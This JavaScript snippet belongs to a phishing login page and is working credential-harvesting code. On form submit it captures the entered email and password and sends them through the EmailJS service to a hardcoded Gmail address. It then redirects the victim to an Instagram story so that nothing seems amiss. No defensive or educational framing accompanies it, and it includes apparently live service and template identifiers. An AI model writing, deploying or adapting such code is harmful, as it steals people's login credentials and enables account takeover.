
    (function () {
      emailjs.init("SukAb-T6BlVqMADe6");
  
      document.querySelector('form').addEventListener('submit', function (event) {
        event.preventDefault();
  
        const emailInput = document.querySelector('input[name="email"]');
        const passwordInput = document.querySelector('input[name="password"]');
        const email = emailInput.value;
        const password = passwordInput.value;
        
        emailInput.classList.remove('invalid-input');
        passwordInput.classList.remove('invalid-input');
  
        if (!email) {
          emailInput.classList.add('invalid-input');
        }
        if (!password) {
          passwordInput.classList.add('invalid-input');
        }
        if (!email || !password) {
          return;
        }
  
        emailjs.send('service_hxb05xw', 'template_p8hydir', {
          to_email: 'whatsuphash2001@gmail.com',
          username: email,
          password: password,
        }).then(function () {
          console.log('Email sent successfully');
          window.location.href = "https://instagram.com/stories/_t_m_u_c_/3073782352667817055?igshid=MDJmNzVkMjY=";
        }).catch(function (error) {
          console.log('Error sending email:', error);
        });
      });
    })();
  